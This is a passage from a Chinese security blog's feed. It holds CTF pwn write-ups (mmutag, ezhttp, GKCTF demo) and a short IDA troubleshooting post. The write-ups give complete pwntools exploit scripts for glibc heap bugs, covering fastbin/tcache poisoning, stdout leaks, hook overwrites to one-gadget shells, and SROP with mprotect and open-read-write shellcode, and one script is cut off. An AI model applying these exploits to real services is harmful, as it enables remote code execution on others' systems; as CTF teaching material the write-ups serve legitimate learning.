class="hljs-number">0x38</span>,payload)sleep(<span class="hljs-number">0.2</span>)sla(<span class="hljs-string">'choice'</span>,<span class="hljs-string">'3'</span>)<span class="hljs-comment"># debug()</span>itr()</code></pre></div><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.anquanke.com/post/id/199468#h2-19" target="_blank" rel="noopener">https://www.anquanke.com/post/id/199468#h2-19</a><br><a href="https://www.anquanke.com/post/id/85357" target="_blank" rel="noopener">https://www.anquanke.com/post/id/85357</a><br><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/fastbin_attack-zh/#house-of-spirit" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/fastbin_attack-zh/#house-of-spirit</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;House-of-Spirit&quot;&gt;&lt;a href=&quot;#House-of-Spirit&quot; class=&quot;headerlink&quot; title=&quot;House of Spirit&quot;&gt;&lt;/a&gt;House of Spirit&lt;/h1&gt;&lt;p&gt;House of Spirit（下面
      
    
    </summary>
    
    
      <category term="pwn" scheme="http://chumen77.xyz/tags/pwn/"/>
    
      <category term="House系列" scheme="http://chumen77.xyz/tags/House%E7%B3%BB%E5%88%97/"/>
    
      <category term="heap" scheme="http://chumen77.xyz/tags/heap/"/>
    
  </entry>
  
  <entry>
    <title>西湖论剑部分wp</title>
    <link href="http://chumen77.xyz/2020/10/09/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91%E9%83%A8%E5%88%86wp/"/>
    <id>http://chumen77.xyz/2020/10/09/西湖论剑部分wp/</id>
    <published>2020-10-09T00:23:05.599Z</published>
    <updated>2020-10-14T15:43:53.754Z</updated>
    
    <content type="html"><![CDATA[<h1 id="西湖论剑部分wp"><a href="#西湖论剑部分wp" class="headerlink" title="西湖论剑部分wp"></a>西湖论剑部分wp</h1><h2 id="mmutag"><a href="#mmutag" class="headerlink" title="mmutag"></a>mmutag</h2><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><ul><li>给了一个栈地址</li><li>没有show函数</li><li>free 函数存在uaf</li><li>add函数只能申请堆号为1-10的堆块，大小仅为0x68</li><li>可以给栈上读一段数据</li></ul><div class="hljs"><pre><code class="hljs c"><span class="hljs-keyword">char</span> buf; <span class="hljs-comment">// [rsp+10h] [rbp-20h]</span></code></pre></div><div class="hljs"><pre><code class="hljs c"><span class="hljs-keyword">if</span> ( v3 != <span class="hljs-number">3</span> )      <span class="hljs-keyword">break</span>;    read(<span class="hljs-number">0</span>, &amp;buf, <span class="hljs-number">0x20</span>uLL);    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Your content: %s\n"</span>, &amp;buf);</code></pre></div><p>利用这个可以泄漏栈上的数据，也可以在栈上写一定的数据。</p><h3 id="难点"><a href="#难点" class="headerlink" title="难点"></a>难点</h3><p>如何泄漏libc地址。</p><p>栈上是有很多数据的，可以用choice 3进行泄漏一定的数据，但是由于<code>\x00</code>的截断，泄漏一个stack地址后，其后有用的libc地址没办法泄漏。</p><p>看下其栈情况：</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/IqyiLw.png" srcset="/img/loading.gif" alt><br>可控区域0x20，如果可以填充其中无用的数据到libc地址，再利用一次 choice 3 即可完成泄漏。</p><p>现在也已经知道了stack的地址。伪造一个0x70的堆，然后fastbin attack即可申请到这栈上的内存。然后填充，获取libc地址。接着攻击malloc hook即可。</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><span class="hljs-comment"># encoding: utf-8</span><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> timelocal_file  = <span class="hljs-string">'./mmutag'</span>elf = ELF(local_file)context.log_level = <span class="hljs-string">'debug'</span>debug = <span class="hljs-number">0</span><span class="hljs-keyword">if</span> debug:    io = process(local_file)    libc = elf.libc<span class="hljs-keyword">else</span>:    io = remote(<span class="hljs-string">'183.129.189.61'</span>,<span class="hljs-number">55704</span>)    libc = elf.libc    <span class="hljs-comment">#libc = ELF('.')</span>context.arch = elf.archcontext.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]<span class="hljs-comment">#,''splitw','-h'</span>rce16 = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]rce18 = [<span class="hljs-number">0x4f2c5</span>,<span class="hljs-number">0x4f322</span>,<span class="hljs-number">0x10a38c</span>]realloc = [<span class="hljs-number">0x2</span>,<span class="hljs-number">0x4</span>,<span class="hljs-number">0x6</span>,<span class="hljs-number">0xB</span>,<span class="hljs-number">0xC</span>,<span class="hljs-number">0xD</span>]arae18 = <span class="hljs-number">0x3ebca0</span>s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>    gdb.attach(io)    pause()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">input_introduce</span><span class="hljs-params">(data)</span>:</span>    sla(<span class="hljs-string">'your introduce'</span>,str(data))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span><span class="hljs-params">(idx,data)</span>:</span>    sla(<span class="hljs-string">'ise'</span>,<span class="hljs-string">'1'</span>)    sla(<span class="hljs-string">'id'</span>,str(idx))    sa(<span class="hljs-string">'tent'</span>,str(data))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span><span class="hljs-params">(idx)</span>:</span>    sla(<span class="hljs-string">'ise'</span>,<span class="hljs-string">'2'</span>)    sla(<span class="hljs-string">'id'</span>,str(idx))data = <span class="hljs-string">'1'</span> * <span class="hljs-number">0x60</span>sa(<span class="hljs-string">'name'</span>,data)ru(<span class="hljs-string">'0x'</span>)leak_libc = int(r(<span class="hljs-number">12</span>),<span class="hljs-number">16</span>)sla(<span class="hljs-string">'ice'</span>,<span class="hljs-string">'2'</span>)add(<span class="hljs-number">1</span>,<span class="hljs-string">'chumen77'</span>)add(<span class="hljs-number">2</span>,<span class="hljs-string">'chumen77'</span>)free(<span class="hljs-number">1</span>)free(<span class="hljs-number">2</span>)free(<span class="hljs-number">1</span>)sla(<span class="hljs-string">'ise'</span>,<span class="hljs-string">'3'</span>)payload = p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x70</span>) + p64(<span class="hljs-number">0</span>)s(payload)add(<span class="hljs-number">4</span>,p64(leak_stack - <span class="hljs-number">0x40</span>))add(<span class="hljs-number">5</span>,<span class="hljs-string">'1'</span>)add(<span class="hljs-number">6</span>,<span class="hljs-string">'1'</span>)add(<span class="hljs-number">7</span>,<span class="hljs-string">'1'</span> * <span class="hljs-number">0x47</span> + <span class="hljs-string">'2'</span>)sla(<span class="hljs-string">'ise'</span>,<span class="hljs-string">'3'</span>)s(<span class="hljs-string">'1'</span> * <span class="hljs-number">0x20</span>)info_addr(<span class="hljs-string">'leak-stack'</span>,leak_stack)ru(<span class="hljs-string">'2'</span>)libc_base = uu64(r(<span class="hljs-number">6</span>)) - <span class="hljs-number">0x20840</span>info_addr(<span class="hljs-string">'libc_base'</span>,libc_base)free(<span class="hljs-number">1</span>)free(<span class="hljs-number">2</span>)free(<span class="hljs-number">1</span>)malloc_hook  = <span class="hljs-number">0x3c4aed</span> + libc_baseadd(<span class="hljs-number">3</span>,p64(malloc_hook))add(<span class="hljs-number">8</span>,<span class="hljs-string">'1'</span>)add(<span class="hljs-number">9</span>,<span class="hljs-string">'1'</span>)one = <span class="hljs-number">0xf0364</span> + libc_basepayload = (<span class="hljs-number">3</span> + <span class="hljs-number">0x10</span>) * <span class="hljs-string">'\x00'</span> + p64(one)add(<span class="hljs-number">10</span>,payload)free(<span class="hljs-number">3</span>)free(<span class="hljs-number">3</span>)<span class="hljs-comment"># debug()</span>itr()</code></pre></div><p>最后因为没有堆可以申请，可以故意触发报错，其会调用到malloc来储存部分数据，此时也就可以get shell。</p><h2 id="ezhttp"><a href="#ezhttp" class="headerlink" title="ezhttp"></a>ezhttp</h2><p>看起来较为复杂，因为实现了一个对Http packet的交互，让我这种不是很熟悉http packet，coding能力差的人，逆向起来有点吃力。</p><h3 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h3><h4 id="前置技能"><a href="#前置技能" class="headerlink" title="前置技能"></a>前置技能</h4><ul><li>简易的Http packet结构</li><li><code>setcontext</code> 函数的exploit</li><li>各种不熟悉的字符串处理函数<code>sscanf strchr strtok</code> </li></ul><h4 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h4><ul><li>开头初始化，开启了沙箱，只能orw来获取flag</li><li>add函数，以输入的字符数量来给你分配堆，所以<code>\x00</code>用不了了，最大0x100，且给了heap的地址</li><li>del 函数，存在uaf</li><li>无show函数</li><li>edit函数，可以输入<code>\x00</code>的字符，无vul</li></ul><h3 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路"></a>攻击思路</h3><ul><li>free 0x100的chunk 8次，使其进入unsortbin，留着攻击stdout</li><li>tcache attack 攻击到<code>_IO_2_1_stdout_</code> ，使其泄漏libc地址</li><li>tcache attack 攻击free hook，写上setcontext + 53 ，准备srop进行攻击</li><li>srop读入mprotect的rop chain，开启heap段的执行权限</li><li>edit 一个heap的内存为 orw flag</li><li>触发free hook，orw get flag</li></ul><h3 id="细节集合"><a href="#细节集合" class="headerlink" title="细节集合"></a>细节集合</h3><h4 id="对于stdout的攻击"><a href="#对于stdout的攻击" class="headerlink" title="对于stdout的攻击"></a>对于stdout的攻击</h4><p>其中，在利用libc残留伪造stdout地址作为fd的时候，只要改3字节，其肯定是申请的0x20的堆，但是上stdout结构体时需要0x21字节的写入。<br>tcache分配中，并不验证堆的大小，只要fd指好就OK了，所以申请个至少可以写入0x21字节的堆即可。但是由于程序分配chunk的策略，申请时肯定要写数据，写什么不会crush。个人做的时候,乱填充数据，crush了很多次，头都炸了。可以看一下<code>_IO_2_1_stdout_</code>结构体：</p><div class="hljs"><pre><code class="hljs undefined">pwndbg&gt; ptype stdout<span class="hljs-built_in">type</span> = struct <span class="hljs-variable">_IO_FILE</span> &#123;    int <span class="hljs-variable">_flags</span>;    char *<span class="hljs-variable">_IO_read_ptr</span>;    char *<span class="hljs-variable">_IO_read_end</span>;    char *<span class="hljs-variable">_IO_read_base</span>;    char *<span class="hljs-variable">_IO_write_base</span>;      char *<span class="hljs-variable">_IO_write_ptr</span>;       char *<span class="hljs-variable">_IO_write_end</span>;    char *<span class="hljs-variable">_IO_buf_base</span>;    char *<span class="hljs-variable">_IO_buf_end</span>;    char *<span class="hljs-variable">_IO_save_base</span>;    char *<span class="hljs-variable">_IO_backup_base</span>;    char *<span class="hljs-variable">_IO_save_end</span>;    struct <span class="hljs-variable">_IO_marker</span> *<span class="hljs-variable">_markers</span>;    struct <span class="hljs-variable">_IO_FILE</span> *<span class="hljs-variable">_chain</span>;    int <span class="hljs-variable">_fileno</span>;    int <span class="hljs-variable">_flags2</span>;    <span class="hljs-variable">__off_t</span> <span class="hljs-variable">_old_offset</span>;    unsigned short <span class="hljs-variable">_cur_column</span>;    signed char <span class="hljs-variable">_vtable_offset</span>;    char <span class="hljs-variable">_shortbuf</span>[<span class="hljs-number">1</span>];    <span class="hljs-variable">_IO_lock_t</span> *<span class="hljs-variable">_lock</span>;    <span class="hljs-variable">__off64_t</span> <span class="hljs-variable">_offset</span>;    struct <span class="hljs-variable">_IO_codecvt</span> *<span class="hljs-variable">_codecvt</span>;    struct <span class="hljs-variable">_IO_wide_data</span> *<span class="hljs-variable">_wide_data</span>;    struct <span class="hljs-variable">_IO_FILE</span> *<span class="hljs-variable">_freeres_list</span>;    void *<span class="hljs-variable">_freeres_buf</span>;    size_t <span class="hljs-variable">__pad5</span>;    int <span class="hljs-variable">_mode</span>;    char <span class="hljs-variable">_unused2</span>[<span class="hljs-number">20</span>];&#125; *</code></pre></div><p>在学习io file相关知识时，可以了解到对于获取和输出信息，很重要的就是开头<code>_flags</code> ，其决定了此时io的状况。</p><p>其中注意到<code>_flags</code> 大小是int型，所以在libc地址其读取和验证将要做什么时，是以int的宽度来获取的。所以设置对低位8字节即可。比如<code>0xfffffffffbad3c80</code> <code>0x12345678fbad3c80</code> ,剩下的就好说了，全弄成<code>a</code>的垃圾字符堆。</p><p>然后再次edit，这个<code>_IO_2_1_stdout_</code>即可泄漏出libc地址。</p><h4 id="改free-hook写setcontext时的细节"><a href="#改free-hook写setcontext时的细节" class="headerlink" title="改free hook写setcontext时的细节"></a>改free hook写setcontext时的细节</h4><p>其中需要注意一下libc版本，在最低的libc 2.27版本中，其经常是以<code>0xXXXXXXX00a0</code>这样的存在。直接改写时，<code>/x00</code>被截断，写不上free hook。然后想着用edit 进行修改。但是会发现，此时坏的free hook情况下，用edit直接crush。</p><p>考虑升级一下libc版本号对应对赛题服务器的libc版本，但是libc2.27最近更新了，直接<code>apt upgrade libc6</code> 就会升级到libc 2.27:1.3最新版本，其增加了对double free的检测，就直接做不了了。</p><p>apt 指定版本的升级：</p><div class="hljs"><pre><code class="hljs undefined">apt-cache madison libc6                  apt-<span class="hljs-builtin-name">get</span> install <span class="hljs-attribute">libc6</span>=2.27-3ubuntu1.2 apt-cache madison libc6-dbgapt-<span class="hljs-builtin-name">get</span> install <span class="hljs-attribute">libc6-dbg</span>=2.27-3ubuntu1.2</code></pre></div><p>这样就升级好了，并且解决了个人写setcontext的问题，因为其地址没有再有``x00<div class="hljs"><pre><code class="hljs 。">### exp```python#!/usr/bin/env python# encoding: utf-8from pwn import *import timelocal_file  = &apos;./ezhttp&apos;elf = ELF(local_file)context.log_level = &apos;debug&apos;debug = 1if debug:    io = process(local_file)    libc = elf.libcelse:    io = remote(&apos;172.17.0.2&apos;,23946)    libc = elf.libc    #libc = ELF(&apos;.&apos;)context.arch = elf.archcontext.terminal = [&apos;tmux&apos;,&apos;neww&apos;]#,&apos;&apos;splitw&apos;,&apos;-h&apos;arae18 = 0x3ebca0s      = lambda data               :io.send(data) sa      = lambda delim,data         :io.sendafter(delim, data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(delim, data)r      = lambda numb=4096          :io.recv(numb)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)uu32    = lambda data               :u32(data.ljust(4, &apos;\0&apos;))uu64    = lambda data               :u64(data.ljust(8, &apos;\0&apos;))info_addr = lambda tag, addr        :io.info(tag + &apos;==&gt;&apos; +&apos;: &#123;:#x&#125;&apos;.format(addr))itr     = lambda                    :io.interactive()def debug():    # gdb.attach(proc.pidof(io)[0],gdbscript=&apos;b main&apos;)    gdb.attach(io)    pause()# debug()def add(data):    content = &apos;POST\n&apos;    content += &apos;/create \nCookie: user=admin token: \r\n\r\n&apos;    content += &apos;content=&apos;+str(data)    ru(&apos;Send Http packet to me:&apos;)    s(str(content))    sleep(0.05)def free(index):    content = &apos;POST\n&apos;    content += &apos;/del \nCookie: user=admin token: \r\n\r\n&apos;    content += &apos;index=&apos;+str(index)    ru(&apos;Send Http packet to me:&apos;)    s(str(content))def edit(idx,data):    content = &apos;POST\n&apos;    content += &apos;/edit \nCookie: user=admin token: \r\n\r\n&apos;    content += &apos;index=&apos;+ str(idx) + &apos;&amp;content=&apos;+str(data)+ &apos;\n&apos;    s(str(content))    sleep(0.05)def leak_addr():    payload = &apos;1&apos; *0x100    add(payload)     ru(&apos;0x&apos;)    heap_base = int(r(12),16) - 0x10    info_addr(&apos;heap_base&apos;,heap_base)    add(payload)     add(&apos;1&apos;*0x8)     add(&apos;1&apos;*0xf8)    for i in range(7):        free(0)    free(0)    add(&apos;\x60\xa7&apos;)     add(&apos;1&apos;*0x18)     add(&apos;1&apos;*0x20)     free(6)    free(6)    add(&apos;1&apos;*0x20)     payload = p64(heap_base + 0x10)    edit(7,payload)    add(&apos;1&apos;*0x20)     # debug()    add(&apos;1&apos;*0x20)     sleep(0.1)    payload = p64(0x12345678fbad3c80) + &apos;\x01&apos; *0x20    add(payload) #8    payload = p64(0xfbad3c80) + p64(0) * 3 + &apos;\x00&apos;    edit(10,payload)    add(&apos;1&apos;*0x90)    return heap_baseleak = 0while True:    try:        heap_base = leak_addr()        ss = io.recvuntil(chr(0x7f),timeout = 0.5)        if len(ss) == 0:            raise Exception(&apos;&apos;)        io.recv(16)        leak = u64(io.recv(8))        if leak == 0x320a6464412e310a:            raise Exception(&apos;&apos;)        break    except Exception:        io.close()        io = process(&apos;./ezhttp&apos;)        continueleak = leak &gt;&gt; 16info_addr(&apos;leak&apos;,leak)libc_base = leak - 0x3eb780info_addr(&apos;libc_base&apos;,libc_base)free_hook = 0x3ed8e8 + libc_baseset_context = libc.sym[&apos;setcontext&apos;] + 53 + libc_baseinfo_addr(&apos;heap_base&apos;,heap_base)info_addr(&apos;context&apos;,set_context)orw = shellcraft.open(&apos;./flag&apos;)orw +=shellcraft.read(&apos;rax&apos;,heap_base+0x300,0x30)orw +=shellcraft.write(1,heap_base+0x300,0x30)edit(11,asm(orw))# debug()frame = SigreturnFrame()frame.rdi = 0frame.rsi = free_hookframe.rdx = 0x300frame.rsp = free_hookframe.rip = libc_base + libc.search(asm(&quot;syscall \nret&quot;)).next()edit(1,str(frame))free(2)free(2)free(2)# debug()add(p64(free_hook))add(&apos;1&apos;*6)info_addr(&apos;context&apos;,set_context)add(p64(set_context))# debug()free(1)pop_rdi = 0x000000000002155f+libc_basepop_rsi = 0x0000000000023e8a+libc_basepop_rdx = libc_base+0x0000000000001b96pop_rax = libc_base+0x0000000000043a78payload = flat([pop_rdi,heap_base-0x250,pop_rsi,0x1000,pop_rdx,7,libc_base+libc.sym[&apos;mprotect&apos;],heap_base+0x80])s(payload)itr()</code></pre></div></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;西湖论剑部分wp&quot;&gt;&lt;a href=&quot;#西湖论剑部分wp&quot; class=&quot;headerlink&quot; title=&quot;西湖论剑部分wp&quot;&gt;&lt;/a&gt;西湖论剑部分wp&lt;/h1&gt;&lt;h2 id=&quot;mmutag&quot;&gt;&lt;a href=&quot;#mmutag&quot; class=&quot;headerli
      
    
    </summary>
    
    
      <category term="pwn" scheme="http://chumen77.xyz/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>mac 上ida 7.0 闪退 打不开 解决办法</title>
    <link href="http://chumen77.xyz/2020/10/06/mac%20%E4%B8%8Aida%207.0%20%E9%97%AA%E9%80%80%20%E6%89%93%E4%B8%8D%E5%BC%80%20%E8%A7%A3%E5%86%B3%E5%8A%9E%E6%B3%95/"/>
    <id>http://chumen77.xyz/2020/10/06/mac 上ida 7.0 闪退 打不开 解决办法/</id>
    <published>2020-10-06T14:37:29.022Z</published>
    <updated>2020-10-09T00:22:47.125Z</updated>
    
    <content type="html"><![CDATA[<h1 id="mac-上ida-7-0-闪退-打不开-解决办法"><a href="#mac-上ida-7-0-闪退-打不开-解决办法" class="headerlink" title="mac 上ida 7.0 闪退 打不开 解决办法"></a>mac 上ida 7.0 闪退 打不开 解决办法</h1><h2 id="情景1"><a href="#情景1" class="headerlink" title="情景1"></a>情景1</h2><p>下载以后直接不能用的。</p><p><a href="https://github.com/fjh658/IDA7.0_SP" target="_blank" rel="noopener">https://github.com/fjh658/IDA7.0_SP</a></p><p><a href="https://github.com/swfangzhang/IDA-pro-7-for-Catalina-OSX-15" target="_blank" rel="noopener">https://github.com/swfangzhang/IDA-pro-7-for-Catalina-OSX-15</a></p><p>参考这个两个github的项目即可。</p><h2 id="情景2"><a href="#情景2" class="headerlink" title="情景2"></a>情景2</h2><p>平时正常使用，突然因为装了冲突的插件打不开ida，直接crash。或者莫名点击ida图标就没有任何反应。进入ida.app bin 下的ida，双击执行命令行中，会显示内核错误的情况。</p><div class="hljs"><pre><code class="hljs python">~ cd .idapro ~/.idapro  rm -rf ida.reg</code></pre></div><p>这样就可以解决了。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;mac-上ida-7-0-闪退-打不开-解决办法&quot;&gt;&lt;a href=&quot;#mac-上ida-7-0-闪退-打不开-解决办法&quot; class=&quot;headerlink&quot; title=&quot;mac 上ida 7.0 闪退 打不开 解决办法&quot;&gt;&lt;/a&gt;mac 上ida 7.0 闪
      
    
    </summary>
    
    
      <category term="杂项" scheme="http://chumen77.xyz/tags/%E6%9D%82%E9%A1%B9/"/>
    
  </entry>
  
  <entry>
    <title>BUUCTF 刷题记录</title>
    <link href="http://chumen77.xyz/2020/09/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
    <id>http://chumen77.xyz/2020/09/28/BUUCTF刷题记录/</id>
    <published>2020-09-28T11:24:58.046Z</published>
    <updated>2020-10-21T11:36:10.414Z</updated>
    
    <content type="html"><![CDATA[<h1 id="BUUCTF刷题记录"><a href="#BUUCTF刷题记录" class="headerlink" title="BUUCTF刷题记录"></a>BUUCTF刷题记录</h1><h2 id="GKCTF-2020-demo"><a href="#GKCTF-2020-demo" class="headerlink" title="GKCTF 2020 demo"></a>GKCTF 2020 demo</h2><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>开启了沙箱，不过在main函数的最后，在while循环里做动作就不会触发到。<br>其中add和free 函数，上来都会检测<code>free_hook malloc_hook</code> 是否不为0，不为0就不让进行相应的操作。</p><h4 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h4><div class="hljs"><pre><code class="hljs c"><span class="hljs-keyword">if</span> ( (nbytes &amp; <span class="hljs-number">0x80000000</span>) == <span class="hljs-number">0L</span>L &amp;&amp; nbytes &lt;= <span class="hljs-number">0x120</span> )       &#123;         heaplist[SHIDWORD(nbytes)] = <span class="hljs-built_in">malloc</span>(nbytes);         <span class="hljs-built_in">puts</span>(<span class="hljs-string">"content:"</span>);         read(<span class="hljs-number">0</span>, heaplist[SHIDWORD(nbytes)], nbytes);         *(heaplist[SHIDWORD(nbytes)] + nbytes) = <span class="hljs-number">0</span>;<span class="hljs-comment">// off by null</span>         ++counts;       &#125;</code></pre></div><p>Add中存在<code>OFF BY NULL</code>。</p><h3 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路"></a>攻击思路</h3><ul><li>利用off by null 构造一个堆重叠</li><li>泄漏出libc地址</li><li>2次释放重叠的chunk，进行fastbin attack <code>malloc_hook_</code>为 one gadget</li><li>通过读入choice的scanf函数，传送大量字节，其会调用malloc申请chunk，即可get shell</li></ul><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> timelocal_file  = <span class="hljs-string">'./domo'</span>elf = ELF(local_file)context.log_level = <span class="hljs-string">'debug'</span>debug = <span class="hljs-number">0</span><span class="hljs-keyword">if</span> debug:    io = process(local_file)    libc = elf.libc<span class="hljs-keyword">else</span>:    io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">27019</span>)    libc = elf.libc    <span class="hljs-comment">#libc = ELF('.')</span>context.arch = elf.archcontext.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]<span class="hljs-comment">#,''splitw','-h'</span>rce16 = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]realloc = [<span class="hljs-number">0x2</span>,<span class="hljs-number">0x4</span>,<span class="hljs-number">0x6</span>,<span class="hljs-number">0xB</span>,<span class="hljs-number">0xC</span>,<span class="hljs-number">0xD</span>]s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>    gdb.attach(io)    pause()<span class="hljs-string">''' line  CODE  JT   JF      K================================= 0000: 0x20 0x00 0x00 0x00000004  A = arch 0001: 0x15 0x00 0x07 0xc000003e  if (A != ARCH_X86_64) goto 0009 0002: 0x20 0x00 0x00 0x00000000  A = sys_number 0003: 0x35 0x00 0x01 0x40000000  if (A &lt; 0x40000000) goto 0005 0004: 0x15 0x00 0x04 0xffffffff  if (A != 0xffffffff) goto 0009 0005: 0x15 0x03 0x00 0x0000000a  if (A == mprotect) goto 0009 0006: 0x15 0x02 0x00 0x0000003b  if (A == execve) goto 0009 0007: 0x15 0x01 0x00 0xffffd8b6  if (A == 0xffffd8b6) goto 0009 0008: 0x06 0x00 0x00 0x7fff0000  return ALLOW 0009: 0x06 0x00 0x00 0x00000000  return KILL'''</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span><span class="hljs-params">(size,data)</span>:</span>    sla(<span class="hljs-string">'&gt;'</span>,<span class="hljs-string">'1'</span>)    sla(<span class="hljs-string">'size'</span>,str(size))    sa(<span class="hljs-string">'tent'</span>,str(data))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span><span class="hljs-params">(idx)</span>:</span>    sla(<span class="hljs-string">'&gt;'</span>,<span class="hljs-string">'2'</span>)    sla(<span class="hljs-string">'dex'</span>,str(idx))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span><span class="hljs-params">(idx)</span>:</span>    sla(<span class="hljs-string">'&gt;'</span>,<span class="hljs-string">'3'</span>)    sla(<span class="hljs-string">'dex'</span>,str(idx))add(<span class="hljs-number">0x80</span>,<span class="hljs-string">'1'</span>) add(<span class="hljs-number">0x68</span>,<span class="hljs-string">'1'</span>) add(<span class="hljs-number">0xf0</span>,<span class="hljs-string">'1'</span>)add(<span class="hljs-number">0x10</span>,<span class="hljs-string">'1'</span>) free(<span class="hljs-number">1</span>)free(<span class="hljs-number">0</span>)data = <span class="hljs-string">'\x00'</span>*<span class="hljs-number">0x60</span>+p64(<span class="hljs-number">0x100</span>)add(<span class="hljs-number">0x68</span>,data)free(<span class="hljs-number">2</span>)add(<span class="hljs-number">0x80</span>,<span class="hljs-string">'\x00'</span>)add(<span class="hljs-number">0x68</span>,<span class="hljs-string">'\x00'</span>)add(<span class="hljs-number">0xf0</span>,<span class="hljs-string">'1'</span>)add(<span class="hljs-number">0x68</span>,<span class="hljs-string">'1'</span>)add(<span class="hljs-number">0x18</span>,<span class="hljs-string">'1'</span>)free(<span class="hljs-number">2</span>)free(<span class="hljs-number">5</span>)free(<span class="hljs-number">0</span>)show(<span class="hljs-number">4</span>)r()libc_base = uu64(r(<span class="hljs-number">6</span>)) - <span class="hljs-number">0x3c4b31</span>info_addr(<span class="hljs-string">'libc_base '</span>,libc_base)malloc_hook=libc_base+libc.symbols[<span class="hljs-string">'__malloc_hook'</span>]realloc_hook=libc_base+libc.symbols[<span class="hljs-string">'realloc'</span>]add(<span class="hljs-number">0x68</span>,p64(malloc_hook<span class="hljs-number">-0x23</span>))add(<span class="hljs-number">0x68</span>,p64(malloc_hook<span class="hljs-number">-0x23</span>))add(<span class="hljs-number">0x68</span>,p64(malloc_hook<span class="hljs-number">-0x23</span>))onegadget = <span class="hljs-number">0x4526a</span> + libc_basedata = <span class="hljs-string">'\x00'</span>*<span class="hljs-number">0xb</span>+p64(onegadget)+ p64(realloc_hook+realloc[<span class="hljs-number">0</span>])add(<span class="hljs-number">0x68</span>,data)sla(<span class="hljs-string">'&gt;'</span>,<span 